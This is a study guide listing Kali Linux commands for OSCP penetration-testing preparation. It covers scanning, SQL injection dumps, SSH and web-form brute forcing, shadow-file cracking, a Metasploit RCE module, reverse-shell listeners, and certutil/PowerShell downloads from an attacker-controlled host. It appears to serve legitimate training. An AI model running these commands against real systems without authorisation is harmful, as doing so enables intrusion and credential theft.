# Essential Kali Linux Tools for OSCP

This guide covers the most important tools in Kali Linux that you'll need for the OSCP exam, organized by category.

## Information Gathering

### Nmap
The network mapper - essential for host discovery and port scanning.

```bash
# Basic scan
nmap 10.10.10.10

# Comprehensive scan with service detection and default scripts
nmap -sC -sV 10.10.10.10

# Full port scan
nmap -p- 10.10.10.10

# UDP scan (top ports)
nmap -sU --top-ports 100 10.10.10.10

# Save output to all formats
nmap -sC -sV -oA scan_name 10.10.10.10
```

### DNS Tools

```bash
# DNS lookup
host example.com

# Detailed DNS information
dig example.com ANY

# Reverse DNS lookup
dig -x 10.10.10.10

# DNS zone transfer attempt
dig axfr @ns1.example.com example.com
```

### Whois
Retrieve domain registration information.

```bash
whois example.com
```

### SMB Enumeration

```bash
# List SMB shares
smbclient -L //10.10.10.10 -N

# Connect to SMB share
smbclient //10.10.10.10/share -N

# Enumerate SMB with enum4linux
enum4linux -a 10.10.10.10
```

## Web Application Analysis

### Gobuster
Directory and file brute forcing tool.

```bash
# Directory brute force
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt

# With file extensions
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html

# Subdomain brute force
gobuster dns -d example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```

### Nikto
Web server scanner for known vulnerabilities.

```bash
nikto -h http://10.10.10.10
```

### Burp Suite
Web application proxy for intercepting and modifying requests.

Key features:
- Proxy: Intercept and modify requests
- Repeater: Modify and resend requests
- Intruder: Automated attacks
- Decoder: Encode/decode data

### WPScan
WordPress vulnerability scanner.

```bash
wpscan --url http://10.10.10.10 --enumerate u
```

## Vulnerability Analysis

### SearchSploit
Offline exploit database search tool.

```bash
# Search for exploits
searchsploit apache 2.4.49

# Copy exploit to current directory
searchsploit -m 50383

# Update database
searchsploit -u
```

### SQLMap
Automated SQL injection tool.

```bash
# Basic scan
sqlmap -u "http://10.10.10.10/page.php?id=1"

# With cookie authentication
sqlmap -u "http://10.10.10.10/page.php?id=1" --cookie="PHPSESSID=abc123"

# Dump database
sqlmap -u "http://10.10.10.10/page.php?id=1" --dump
```

## Password Attacks

### Hydra
Online password cracking tool.

```bash
# SSH brute force
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10

# HTTP POST form
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"
```

### John the Ripper
Offline password cracker.

```bash
# Crack Linux shadow file
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt

# Crack Windows hashes
john --format=NT hashes.txt

# Use wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

### Hashcat
GPU-accelerated password cracker.

```bash
# MD5 hash cracking
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# Windows NTLM hash
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

## Exploitation Tools

### Metasploit Framework
Exploitation framework (limited use allowed in OSCP).

```bash
# Start Metasploit
msfconsole

# Search for exploits
search apache 2.4.49

# Use an exploit
use exploit/multi/http/apache_normalize_path_rce

# Set options
set RHOSTS 10.10.10.10
set LHOST 192.168.1.100

# Run exploit
exploit
```

### Reverse Shell Handlers

```bash
# Netcat listener
nc -lvnp 4444

# Socat listener (more stable)
socat TCP-LISTEN:4444,reuseaddr,fork STDOUT
```

## Post-Exploitation

### Privilege Escalation Scripts

**Linux:**
```bash
# LinPEAS
./linpeas.sh

# Linux Smart Enumeration
./lse.sh -l 1
```

**Windows:**
```bash
# WinPEAS
.\winPEASx64.exe

# PowerUp
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
```

### File Transfer Methods

**Linux:**
```bash
# Start Python HTTP server
python3 -m http.server 8000

# Download with wget
wget http://192.168.1.100:8000/file.txt

# Download with curl
curl http://192.168.1.100:8000/file.txt -o file.txt
```

**Windows:**
```bash
# PowerShell download
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.1.100:8000/file.exe', 'file.exe')"

# Certutil
certutil -urlcache -split -f "http://192.168.1.100:8000/file.exe" file.exe
```

### Impacket Tools
Collection of Python scripts for working with network protocols.

```bash
# SMB server for file transfers
impacket-smbserver share $(pwd) -smb2support

# PSExec-like functionality
impacket-psexec administrator:password@10.10.10.10

# WMI execution
impacket-wmiexec administrator:password@10.10.10.10
```

## Documentation Tools

### Screenshot Tools

```bash
# Command line screenshot
scrot -s screenshot.png

# Flameshot (GUI tool)
flameshot gui
```

### Note-Taking

- **CherryTree**: Hierarchical note-taking application
- **KeepNote**: Note-taking with rich text and organization
- **Visual Studio Code**: Code editor with Markdown support

## OSCP-Specific Tool Configuration

### Configuring Aliases

Add these to your `~/.zshrc` or `~/.bashrc`:

```bash
# Quick directory navigation
alias oscp='cd ~/oscp'
alias targets='cd ~/oscp/targets'

# Quick tool access
alias msfconsole='msfconsole -q'
alias ss='searchsploit'
alias nse='ls /usr/share/nmap/scripts | grep'

# Quick server setup
alias webserver='python3 -m http.server 8000'
alias smb-server='sudo impacket-smbserver share $(pwd) -smb2support'

# Quick scanning
alias quickscan='sudo nmap -sC -sV -oA quick'
alias fullscan='sudo nmap -p- -oA full'
```

### Tool Organization

Create a custom tools directory:

```bash
mkdir -p ~/oscp/tools
cd ~/oscp/tools

# Clone useful repositories
git clone https://github.com/carlospolop/PEASS-ng.git
git clone https://github.com/rebootuser/LinEnum.git
git clone https://github.com/PowerShellMafia/PowerSploit.git
git clone https://github.com/samratashok/nishang.git
```

## OSCP Exam Tips

1. **Tool Selection**: Prefer manual techniques over automated tools when possible
2. **Documentation**: Document every command and result
3. **Methodology**: Follow a consistent methodology for each target
4. **Time Management**: Don't spend too long on one target; rotate if stuck
5. **Backup Tools**: Have multiple tools for the same purpose in case one fails

Remember, the OSCP exam is about demonstrating your understanding of the penetration testing process, not just running tools. Focus on understanding what each tool does and why you're using it.
